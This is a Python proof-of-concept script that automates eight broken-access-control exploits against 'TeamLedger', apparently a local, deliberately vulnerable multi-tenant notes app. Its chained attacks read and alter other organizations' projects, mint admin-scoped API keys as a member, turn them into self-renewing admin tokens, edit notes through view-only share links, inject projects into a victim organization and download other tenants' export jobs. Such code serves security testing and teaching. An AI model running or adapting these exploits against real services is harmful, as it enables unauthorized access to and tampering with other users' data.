#!/usr/bin/env python3
"""
TeamLedger BAC Vulnerabilities PoC Testing Suite
=================================================
Automated exploitation of 8 complex Broken Access Control vulnerabilities.

Usage: python exploit_bac_vulnerabilities.py [--url http://localhost:8003]
"""

import asyncio
import httpx
import uuid
import json
import time
from datetime import datetime
from typing import Optional, Dict, Any
import sys
import argparse


class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class TeamLedgerExploit:
    def __init__(self, base_url: str = "http://localhost:8003"):
        self.base_url = base_url.rstrip('/')
        self.api_base = f"{self.base_url}/api/v1"
        self.client = None

    async def __aenter__(self):
        self.client = httpx.AsyncClient(timeout=30.0)
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.client:
            await self.client.aclose()

    def log(self, message: str, level: str = "INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        color = {
            "INFO": Colors.OKBLUE,
            "SUCCESS": Colors.OKGREEN,
            "WARN": Colors.WARNING,
            "ERROR": Colors.FAIL,
            "HEADER": Colors.HEADER
        }.get(level, Colors.ENDC)

        print(f"{color}[{timestamp}] [{level}] {message}{Colors.ENDC}")

    def print_separator(self):
        print(f"{Colors.OKCYAN}{'='*80}{Colors.ENDC}")

    async def register_user(self, email: str = None, password: str = "TestPass123!") -> Dict[str, str]:
        """Register a new user"""
        email = email or f"user_{uuid.uuid4().hex[:8]}@test.com"
        self.log(f"Registering user: {email}")

        response = await self.client.post(
            f"{self.api_base}/auth/register",
            json={
                "email": email,
                "password": password,
                "full_name": f"Test User {uuid.uuid4().hex[:4]}"
            }
        )

        if response.status_code != 200:
            self.log(f"Registration failed: {response.text}", "ERROR")
            return {}

        self.log(f"User registered successfully", "SUCCESS")
        return {"email": email, "password": password}

    async def login_user(self, email: str, password: str) -> str:
        """Login and get JWT token"""
        self.log(f"Logging in as: {email}")

        response = await self.client.post(
            f"{self.api_base}/auth/login",
            data={"username": email, "password": password}
        )

        if response.status_code != 200:
            self.log(f"Login failed: {response.text}", "ERROR")
            return ""

        token = response.json()["data"]["access_token"]
        self.log(f"Login successful, token: {token[:20]}...", "SUCCESS")
        return token

    async def create_organization(self, token: str, name: str = None) -> Dict[str, str]:
        """Create a new organization"""
        name = name or f"TestOrg-{uuid.uuid4().hex[:6]}"
        slug = f"{name.lower().replace(' ', '-')}-{uuid.uuid4().hex[:4]}"
        self.log(f"Creating organization: {name}")

        response = await self.client.post(
            f"{self.api_base}/organizations/",
            headers={"Authorization": f"Bearer {token}"},
            json={"name": name, "slug": slug}
        )

        if response.status_code != 200:
            self.log(f"Org creation failed: {response.text}", "ERROR")
            return {}

        org_data = response.json()["data"]
        self.log(f"Organization created: {org_data['id']}", "SUCCESS")
        return org_data

    async def switch_organization(self, token: str, org_id: str, api_key: str = None) -> str:
        """Switch to an organization context"""
        self.log(f"Switching to organization: {org_id}")

        headers = {"Authorization": f"Bearer {token}"}
        if api_key:
            headers["X-API-Key"] = api_key

        response = await self.client.post(
            f"{self.api_base}/organizations/{org_id}/switch",
            headers=headers
        )

        if response.status_code != 200:
            self.log(f"Org switch failed: {response.text}", "ERROR")
            return ""

        new_token = response.json()["data"]["access_token"]
        self.log(f"Switched successfully, new token: {new_token[:20]}...", "SUCCESS")
        return new_token

    async def create_project(self, token: str, name: str = None, api_key: str = None) -> Dict[str, str]:
        """Create a project"""
        name = name or f"TestProject-{uuid.uuid4().hex[:6]}"
        self.log(f"Creating project: {name}")

        headers = {"Authorization": f"Bearer {token}"}
        if api_key:
            headers["X-API-Key"] = api_key

        response = await self.client.post(
            f"{self.api_base}/projects/",
            headers=headers,
            json={"name": name, "description": "Test project"}
        )

        if response.status_code != 200:
            self.log(f"Project creation failed: {response.text}", "ERROR")
            return {}

        project_data = response.json()["data"]
        self.log(f"Project created: {project_data['id']}", "SUCCESS")
        return project_data

    async def create_note(self, token: str, project_id: str, title: str = None, content: str = "Test content", api_key: str = None) -> Dict[str, str]:
        """Create a note"""
        title = title or f"TestNote-{uuid.uuid4().hex[:6]}"
        self.log(f"Creating note: {title}")

        headers = {"Authorization": f"Bearer {token}"}
        if api_key:
            headers["X-API-Key"] = api_key

        response = await self.client.post(
            f"{self.api_base}/notes/?project_id={project_id}",
            headers=headers,
            json={"title": title, "content": content}
        )

        if response.status_code != 200:
            self.log(f"Note creation failed: {response.text}", "ERROR")
            return {}

        note_data = response.json()["data"]
        self.log(f"Note created: {note_data['id']}", "SUCCESS")
        return note_data

    async def create_api_key(self, token: str, name: str = None, scopes: str = "read") -> Dict[str, str]:
        """Create an API key"""
        name = name or f"TestKey-{uuid.uuid4().hex[:6]}"
        self.log(f"Creating API key: {name} with scopes: {scopes}")

        response = await self.client.post(
            f"{self.api_base}/api-keys/",
            headers={"Authorization": f"Bearer {token}"},
            json={"name": name, "scopes": scopes}
        )

        if response.status_code != 200:
            self.log(f"API key creation failed: {response.text}", "ERROR")
            return {}

        key_data = response.json()["data"]
        self.log(f"API key created: {key_data['key'][:20]}...", "SUCCESS")
        return key_data

    async def generate_share_link(self, token: str, note_id: str, project_id: str, access_level: str = "view") -> Dict[str, str]:
        """Generate a share link for a note"""
        self.log(f"Generating share link with access_level: {access_level}")

        response = await self.client.post(
            f"{self.api_base}/notes/{note_id}/share?project_id={project_id}&access_level={access_level}",
            headers={"Authorization": f"Bearer {token}"}
        )

        if response.status_code != 200:
            self.log(f"Share link generation failed: {response.text}", "ERROR")
            return {}

        share_data = response.json()["data"]
        self.log(f"Share link created: {share_data['share_url']}", "SUCCESS")
        return share_data

    async def export_project(self, token: str, project_id: str, api_key: str = None) -> str:
        """Export a project"""
        self.log(f"Exporting project: {project_id}")

        headers = {"Authorization": f"Bearer {token}"}
        if api_key:
            headers["X-API-Key"] = api_key

        response = await self.client.post(
            f"{self.api_base}/projects/{project_id}/export",
            headers=headers
        )

        if response.status_code != 200:
            self.log(f"Export failed: {response.text}", "ERROR")
            return ""

        job_id = response.json()["data"]["id"]
        self.log(f"Export job created: {job_id}", "SUCCESS")
        return job_id

    # ============================================================================
    # BAC-1: Cross-Organization Resource Access via Stale Context
    # ============================================================================

    async def exploit_bac1(self):
        """BAC-1: Cross-Organization Resource Access"""
        self.print_separator()
        self.log("EXPLOIT: BAC-1 - Cross-Organization Resource Access via Stale Context", "HEADER")
        self.print_separator()

        # Step 1: Setup - Create User A with Org A
        self.log("Step 1: Setting up attacker user and Organization A")
        user_a = await self.register_user()
        token_a = await self.login_user(user_a["email"], user_a["password"])
        org_a = await self.create_organization(token_a, "VictimOrgA")
        token_org_a = await self.switch_organization(token_a, org_a["id"])

        # Step 2: Create project in Org A
        self.log("Step 2: Creating project in Organization A")
        project_a = await self.create_project(token_org_a, "VictimProject")

        # Step 3: Create Org B
        self.log("Step 3: Creating Organization B")
        org_b = await self.create_organization(token_a, "AttackerOrgB")
        token_org_b = await self.switch_organization(token_a, org_b["id"])

        # Step 4: EXPLOIT - Access Org A's project from Org B context
        self.log("Step 4: EXPLOITING - Accessing Org A project with Org B token", "WARN")
        self.log(f"   Target project ID: {project_a['id']}", "INFO")
        self.log(f"   Org A ID: {org_a['id']}", "INFO")
        self.log(f"   Org B ID: {org_b['id']}", "INFO")

        response = await self.client.get(
            f"{self.api_base}/projects/{project_a['id']}",
            headers={"Authorization": f"Bearer {token_org_b}"}
        )

        self.log(f"   Response status: {response.status_code}", "INFO")
        if response.status_code == 200:
            project_data = response.json()["data"]
            self.log("✓ VULNERABILITY CONFIRMED: Cross-org access successful!", "SUCCESS")
            self.log(f"   Accessed project from Org A while in Org B context", "SUCCESS")
            self.log(f"   Project org_id: {project_data.get('organization_id')}", "INFO")

            # Step 5: Try to modify
            self.log("Step 5: EXPLOITING - Modifying Org A project from Org B", "WARN")
            response = await self.client.put(
                f"{self.api_base}/projects/{project_a['id']}",
                headers={"Authorization": f"Bearer {token_org_b}"},
                json={"name": "HACKED BY ORG B", "description": "Cross-org modification"}
            )

            if response.status_code == 200:
                self.log("✓ CRITICAL: Successfully modified cross-org resource!", "SUCCESS")
                self.log(f"   Response: {json.dumps(response.json(), indent=2)}")
            else:
                self.log(f"✗ Modification blocked: {response.status_code}", "ERROR")
        else:
            self.log(f"✗ Vulnerability not present: {response.status_code}", "ERROR")

        self.print_separator()

    # ============================================================================
    # BAC-2: Privilege Escalation via API Key Scope Injection
    # ============================================================================

    async def exploit_bac2(self):
        """BAC-2: Privilege Escalation via API Key Scope Injection"""
        self.print_separator()
        self.log("EXPLOIT: BAC-2 - Privilege Escalation via API Key Scope Injection", "HEADER")
        self.print_separator()

        # Step 1: Setup - Create low-privilege user
        self.log("Step 1: Creating low-privilege member account")
        user = await self.register_user()
        token = await self.login_user(user["email"], user["password"])
        org = await self.create_organization(token, "TargetOrg")
        token_org = await self.switch_organization(token, org["id"])

        # Step 2: EXPLOIT - Create API key with admin scopes as member
        self.log("Step 2: EXPLOITING - Creating API key with 'admin' scope as member", "WARN")

        api_key_data = await self.create_api_key(token_org, "EscalatedKey", "admin")

        if api_key_data and "key" in api_key_data:
            api_key = api_key_data["key"]
            self.log("✓ VULNERABILITY CONFIRMED: API key with admin scope created!", "SUCCESS")

            # Step 3: Test if admin scope is trusted
            self.log("Step 3: Testing if API key admin scope is trusted", "WARN")

            # Try to perform admin action - create another user (or any admin operation)
            response = await self.client.get(
                f"{self.api_base}/projects/",
                headers={"X-API-Key": api_key}
            )

            if response.status_code == 200:
                self.log("✓ API key authentication works", "SUCCESS")

                # Try admin operation
                response = await self.client.get(
                    f"{self.api_base}/api-keys/",
                    headers={"X-API-Key": api_key}
                )

                if response.status_code == 200:
                    self.log("✓ CRITICAL: Admin operations possible with injected scope!", "SUCCESS")
                    self.log(f"   API key scope is trusted without role validation")
                else:
                    self.log(f"Admin operation status: {response.status_code}", "INFO")
            else:
                self.log(f"✗ API key not working: {response.status_code}", "ERROR")
        else:
            self.log("✗ Could not create API key with admin scope", "ERROR")

        self.print_separator()

    # ============================================================================
    # BAC-3: Nested Resource Authorization Bypass
    # ============================================================================

    async def exploit_bac3(self):
        """BAC-3: Nested Resource Authorization Bypass"""
        self.print_separator()
        self.log("EXPLOIT: BAC-3 - Nested Resource Authorization Bypass", "HEADER")
        self.print_separator()

        # Step 1: Victim creates project with notes
        self.log("Step 1: Victim creates project with notes")
        victim = await self.register_user()
        victim_token = await self.login_user(victim["email"], victim["password"])
        victim_org = await self.create_organization(victim_token, "VictimOrg")
        victim_token_org = await self.switch_organization(victim_token, victim_org["id"])

        victim_project = await self.create_project(victim_token_org, "SensitiveProject")
        public_note = await self.create_note(victim_token_org, victim_project["id"], "PublicNote", "This is public")
        private_note = await self.create_note(victim_token_org, victim_project["id"], "PrivateNote", "CONFIDENTIAL DATA")

        # Step 2: Share one note publicly
        self.log("Step 2: Victim shares one note publicly")
        share_data = await self.generate_share_link(victim_token_org, public_note["id"], victim_project["id"], "view")
        share_token = share_data.get("share_token", "")

        # Step 3: Attacker accesses shared note (public)
        self.log("Step 3: Attacker accesses shared note (no auth required)")
        attacker = await self.register_user()
        attacker_token = await self.login_user(attacker["email"], attacker["password"])
        attacker_org = await self.create_organization(attacker_token, "AttackerOrg")
        attacker_token_org = await self.switch_organization(attacker_token, attacker_org["id"])

        response = await self.client.get(
            f"{self.api_base}/notes/shared/{share_token}"
        )

        if response.status_code == 200:
            shared_note_data = response.json()["data"]
            leaked_project_id = shared_note_data.get("project_id")
            self.log(f"✓ Shared note accessed, leaked project_id: {leaked_project_id}", "SUCCESS")

            # Step 4: EXPLOIT - Use project_id to access all notes
            self.log("Step 4: EXPLOITING - Using leaked project_id to access ALL notes", "WARN")

            response = await self.client.get(
                f"{self.api_base}/notes/?project_id={leaked_project_id}",
                headers={"Authorization": f"Bearer {attacker_token_org}"}
            )

            if response.status_code == 200:
                notes = response.json()["data"]
                self.log(f"✓ VULNERABILITY CONFIRMED: Accessed {len(notes)} notes including private ones!", "SUCCESS")

                for note in notes:
                    self.log(f"   - {note['title']}: {note['content'][:50]}...", "SUCCESS")

                if len(notes) > 1:
                    self.log("✓ CRITICAL: Private notes accessible via nested resource bypass!", "SUCCESS")
            else:
                self.log(f"✗ Notes access blocked: {response.status_code}", "ERROR")
        else:
            self.log(f"✗ Shared note access failed: {response.status_code}", "ERROR")

        self.print_separator()

    # ============================================================================
    # BAC-4: Role Persistence via Multi-Step Token Flow
    # ============================================================================

    async def exploit_bac4(self):
        """BAC-4: Role Persistence via Multi-Step Token Flow"""
        self.print_separator()
        self.log("EXPLOIT: BAC-4 - Role Persistence via Multi-Step Token Flow", "HEADER")
        self.print_separator()

        # Step 1: Create user and get member role
        self.log("Step 1: Creating user as member")
        user = await self.register_user()
        token = await self.login_user(user["email"], user["password"])
        org = await self.create_organization(token, "TestOrg")
        token_org = await self.switch_organization(token, org["id"])

        # Step 2: Create API key with admin scope (via BAC-2)
        self.log("Step 2: Creating API key with admin scope (exploiting BAC-2)")
        api_key_data = await self.create_api_key(token_org, "PersistentAdminKey", "admin")

        if not api_key_data or "key" not in api_key_data:
            self.log("Could not create admin API key, skipping BAC-4", "WARN")
            return

        api_key = api_key_data["key"]

        # Step 3: Use API key to switch org and get JWT with admin role
        self.log("Step 3: EXPLOITING - Using API key to get JWT with admin role", "WARN")

        admin_jwt = await self.switch_organization(token_org, org["id"], api_key)

        if admin_jwt:
            self.log("✓ VULNERABILITY CONFIRMED: API key scope became JWT role!", "SUCCESS")

            # Step 4: Create another API key with admin scope using the new JWT
            self.log("Step 4: Creating backup admin API key before JWT expires", "WARN")

            backup_key_data = await self.create_api_key(admin_jwt, "BackupAdminKey", "admin")

            if backup_key_data and "key" in backup_key_data:
                self.log("✓ CRITICAL: Created backup admin key - infinite privilege loop!", "SUCCESS")
                self.log("   Attack chain: API key -> Admin JWT -> New API key -> ...", "SUCCESS")

                # Step 5: Demonstrate the loop
                backup_key = backup_key_data["key"]
                new_admin_jwt = await self.switch_organization(token_org, org["id"], backup_key)

                if new_admin_jwt:
                    self.log("✓ Self-perpetuating admin access confirmed!", "SUCCESS")
            else:
                self.log("Backup key creation failed", "WARN")
        else:
            self.log("✗ Could not get JWT from API key", "ERROR")

        self.print_separator()

    # ============================================================================
    # BAC-5: Cross-Membership Resource Manipulation
    # ============================================================================

    async def exploit_bac5(self):
        """BAC-5: Cross-Membership Resource Manipulation"""
        self.print_separator()
        self.log("EXPLOIT: BAC-5 - Cross-Membership Resource Manipulation", "HEADER")
        self.print_separator()

        # Step 1: Create User A in shared org
        self.log("Step 1: User A creates organization and project")
        user_a = await self.register_user()
        token_a = await self.login_user(user_a["email"], user_a["password"])
        shared_org = await self.create_organization(token_a, "SharedOrg")
        token_a_org = await self.switch_organization(token_a, shared_org["id"])

        project_a = await self.create_project(token_a_org, "UserA-Project")

        # Step 2: Generate invite and User B joins same org
        self.log("Step 2: User B joins the same organization")

        response = await self.client.post(
            f"{self.api_base}/organizations/{shared_org['id']}/invite",
            headers={"Authorization": f"Bearer {token_a_org}"}
        )

        if response.status_code != 200:
            self.log("Could not generate invite token, creating separate user", "WARN")
            user_b = await self.register_user()
            token_b = await self.login_user(user_b["email"], user_b["password"])
            org_b = await self.create_organization(token_b, "UserBOrg")
            token_b_org = await self.switch_organization(token_b, org_b["id"])
        else:
            invite_token = response.json()["data"]["invite_token"]

            user_b = await self.register_user()
            token_b = await self.login_user(user_b["email"], user_b["password"])

            await self.client.post(
                f"{self.api_base}/organizations/join",
                headers={"Authorization": f"Bearer {token_b}"},
                json={"invite_token": invite_token}
            )

            token_b_org = await self.switch_organization(token_b, shared_org["id"])

        # Step 3: EXPLOIT - User B modifies User A's project
        self.log("Step 3: EXPLOITING - User B modifying User A's project", "WARN")

        response = await self.client.put(
            f"{self.api_base}/projects/{project_a['id']}",
            headers={"Authorization": f"Bearer {token_b_org}"},
            json={"name": "HIJACKED BY USER B", "description": "Horizontal privilege escalation"}
        )

        if response.status_code == 200:
            self.log("✓ VULNERABILITY CONFIRMED: Cross-membership modification successful!", "SUCCESS")
            self.log("   User B modified User A's project in same org", "SUCCESS")
        else:
            self.log(f"✗ Modification blocked: {response.status_code}", "ERROR")

        self.print_separator()

    # ============================================================================
    # BAC-6: Import-Based Ownership Hijacking
    # ============================================================================

    async def exploit_bac6(self):
        """BAC-6: Import-Based Ownership Hijacking"""
        self.print_separator()
        self.log("EXPLOIT: BAC-6 - Import-Based Ownership Hijacking", "HEADER")
        self.print_separator()

        # Step 1: Attacker creates org and exports project
        self.log("Step 1: Attacker creates project and exports it")
        attacker = await self.register_user()
        attacker_token = await self.login_user(attacker["email"], attacker["password"])
        attacker_org = await self.create_organization(attacker_token, "AttackerOrg")
        attacker_token_org = await self.switch_organization(attacker_token, attacker_org["id"])

        decoy_project = await self.create_project(attacker_token_org, "DecoyProject")
        await self.create_note(attacker_token_org, decoy_project["id"], "DecoyNote", "Normal content")

        # Step 2: Victim creates org
        self.log("Step 2: Victim creates organization")
        victim = await self.register_user()
        victim_token = await self.login_user(victim["email"], victim["password"])
        victim_org = await self.create_organization(victim_token, "VictimOrg")
        victim_token_org = await self.switch_organization(victim_token, victim_org["id"])

        # Step 3: EXPLOIT - Import with modified organization_id
        self.log("Step 3: EXPLOITING - Importing project with victim's org_id", "WARN")

        malicious_import = {
            "project": {
                "name": "TrojanProject",
                "description": "Injected by attacker",
                "organization_id": victim_org["id"],
                "created_by": victim["email"],
                "status": "active"
            },
            "notes": [
                {
                    "title": "Backdoor Note",
                    "content": "Malicious content injected into victim org",
                    "organization_id": victim_org["id"],
                    "version": 1
                }
            ]
        }

        response = await self.client.post(
            f"{self.api_base}/projects/import",
            headers={"Authorization": f"Bearer {attacker_token_org}"},
            json=malicious_import
        )

        if response.status_code == 200:
            self.log("✓ VULNERABILITY CONFIRMED: Cross-org import successful!", "SUCCESS")
            imported_project_id = response.json()["data"]["id"]

            # Step 4: Verify victim sees the injected project
            self.log("Step 4: Verifying victim can see injected project", "WARN")

            response = await self.client.get(
                f"{self.api_base}/projects/",
                headers={"Authorization": f"Bearer {victim_token_org}"}
            )

            if response.status_code == 200:
                victim_projects = response.json()["data"]
                injected = [p for p in victim_projects if p["id"] == imported_project_id]

                if injected:
                    self.log("✓ CRITICAL: Project successfully injected into victim org!", "SUCCESS")
                    self.log(f"   Victim sees injected project: {json.dumps(injected[0], indent=2)}")
                else:
                    self.log("Injected project not visible to victim", "WARN")
        else:
            self.log(f"✗ Import failed: {response.status_code} - {response.text}", "ERROR")

        self.print_separator()

    # ============================================================================
    # BAC-7: Share Token Authorization Scope Creep
    # ============================================================================

    async def exploit_bac7(self):
        """BAC-7: Share Token Authorization Scope Creep"""
        self.print_separator()
        self.log("EXPLOIT: BAC-7 - Share Token Authorization Scope Creep", "HEADER")
        self.print_separator()

        # Step 1: Create note with view-only share
        self.log("Step 1: Creating note with view-only share link")
        user = await self.register_user()
        token = await self.login_user(user["email"], user["password"])
        org = await self.create_organization(token, "TestOrg")
        token_org = await self.switch_organization(token, org["id"])

        project = await self.create_project(token_org, "TestProject")
        note = await self.create_note(token_org, project["id"], "TestNote", "Original content")

        share_data = await self.generate_share_link(token_org, note["id"], project["id"], "view")
        share_token = share_data.get("share_token", "")

        # Step 2: Verify it's view-only
        self.log("Step 2: Verifying share link has view-only access")

        response = await self.client.get(
            f"{self.api_base}/notes/shared/{share_token}"
        )

        if response.status_code == 200:
            note_data = response.json()["data"]
            access_level = note_data.get("share_access_level", note_data.get("access_level", "unknown"))
            self.log(f"   Access level: {access_level}", "INFO")

            # Step 3: EXPLOIT - Try to modify despite view-only
            self.log("Step 3: EXPLOITING - Attempting to modify with view-only token", "WARN")

            response = await self.client.put(
                f"{self.api_base}/notes/shared/{share_token}",
                json={"content": "HACKED CONTENT - Modified with view-only token!"}
            )

            if response.status_code == 200:
                self.log("✓ VULNERABILITY CONFIRMED: Modified note with view-only access!", "SUCCESS")
                self.log(f"   New content: {response.json()['data']['content']}", "SUCCESS")
                self.log("✓ CRITICAL: Access level 'view' not enforced!", "SUCCESS")
            else:
                self.log(f"✗ Modification blocked: {response.status_code}", "ERROR")
        else:
            self.log(f"✗ Could not access shared note: {response.status_code}", "ERROR")

        self.print_separator()

    # ============================================================================
    # BAC-8: Job Context Privilege Inheritance
    # ============================================================================

    async def exploit_bac8(self):
        """BAC-8: Job Context Privilege Inheritance"""
        self.print_separator()
        self.log("EXPLOIT: BAC-8 - Job Context Privilege Inheritance", "HEADER")
        self.print_separator()

        # Step 1: Create project and export in Org A
        self.log("Step 1: Creating export job in Organization A")
        user = await self.register_user()
        token = await self.login_user(user["email"], user["password"])
        org_a = await self.create_organization(token, "OrgA")
        token_org_a = await self.switch_organization(token, org_a["id"])

        project_a = await self.create_project(token_org_a, "SensitiveProject")
        await self.create_note(token_org_a, project_a["id"], "SensitiveNote", "CONFIDENTIAL DATA")

        job_id_a = await self.export_project(token_org_a, project_a["id"])

        # Step 2: Switch to Org B
        self.log("Step 2: Switching to Organization B")
        org_b = await self.create_organization(token, "OrgB")
        token_org_b = await self.switch_organization(token, org_b["id"])

        # Step 3: EXPLOIT - Access Org A's job from Org B context
        self.log("Step 3: EXPLOITING - Accessing Org A job from Org B context", "WARN")

        response = await self.client.get(
            f"{self.api_base}/jobs/{job_id_a}",
            headers={"Authorization": f"Bearer {token_org_b}"}
        )

        if response.status_code == 200:
            self.log("✓ VULNERABILITY CONFIRMED: Accessed cross-org job!", "SUCCESS")
            job_data = response.json()["data"]

            # Wait for job to complete
            self.log("   Waiting for job to complete...")
            for _ in range(10):
                await asyncio.sleep(1)
                response = await self.client.get(
                    f"{self.api_base}/jobs/{job_id_a}",
                    headers={"Authorization": f"Bearer {token_org_b}"}
                )
                if response.status_code == 200:
                    job_data = response.json()["data"]
                    if job_data.get("status") == "completed":
                        break

            if job_data.get("status") == "completed":
                self.log("   Job completed, attempting download", "INFO")

                # Step 4: Download results
                response = await self.client.get(
                    f"{self.api_base}/jobs/{job_id_a}/download",
                    headers={"Authorization": f"Bearer {token_org_b}"}
                )

                if response.status_code == 200:
                    self.log("✓ CRITICAL: Downloaded cross-org job results!", "SUCCESS")
                    self.log(f"   Data preview: {response.text[:200]}...", "SUCCESS")
                else:
                    self.log(f"Download failed: {response.status_code}", "WARN")
            else:
                self.log(f"Job status: {job_data.get('status')}", "INFO")
        else:
            self.log(f"✗ Job access blocked: {response.status_code}", "ERROR")

        self.print_separator()


async def main_menu():
    parser = argparse.ArgumentParser(description="TeamLedger BAC Vulnerabilities PoC")
    parser.add_argument("--url", default="http://localhost:8003", help="Base URL of TeamLedger instance")
    args = parser.parse_args()

    print(f"{Colors.HEADER}{Colors.BOLD}")
    print("="*80)
    print("   TeamLedger - BAC Vulnerabilities Testing Suite")
    print("   Automated Proof-of-Concept for 8 Complex Access Control Flaws")
    print("="*80)
    print(f"{Colors.ENDC}")
    print(f"Target: {args.url}\n")

    menu_options = {
        "1": ("BAC-1: Cross-Organization Resource Access", "exploit_bac1"),
        "2": ("BAC-2: Privilege Escalation via API Key Scope Injection", "exploit_bac2"),
        "3": ("BAC-3: Nested Resource Authorization Bypass", "exploit_bac3"),
        "4": ("BAC-4: Role Persistence via Multi-Step Token Flow", "exploit_bac4"),
        "5": ("BAC-5: Cross-Membership Resource Manipulation", "exploit_bac5"),
        "6": ("BAC-6: Import-Based Ownership Hijacking", "exploit_bac6"),
        "7": ("BAC-7: Share Token Authorization Scope Creep", "exploit_bac7"),
        "8": ("BAC-8: Job Context Privilege Inheritance", "exploit_bac8"),
        "9": ("Run ALL exploits", "all"),
        "0": ("Exit", "exit")
    }

    while True:
        print(f"\n{Colors.OKCYAN}Available Exploits:{Colors.ENDC}")
        for key, (name, _) in menu_options.items():
            print(f"  [{key}] {name}")

        choice = input(f"\n{Colors.BOLD}Select option: {Colors.ENDC}").strip()

        if choice not in menu_options:
            print(f"{Colors.FAIL}Invalid option{Colors.ENDC}")
            continue

        if choice == "0":
            print(f"{Colors.OKGREEN}Exiting...{Colors.ENDC}")
            break

        async with TeamLedgerExploit(args.url) as exploit:
            if choice == "9":
                for i in range(1, 9):
                    method_name = menu_options[str(i)][1]
                    method = getattr(exploit, method_name)
                    await method()
                    print("\n")
            else:
                method_name = menu_options[choice][1]
                method = getattr(exploit, method_name)
                await method()


if __name__ == "__main__":
    try:
        asyncio.run(main_menu())
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Interrupted by user{Colors.ENDC}")
        sys.exit(0)
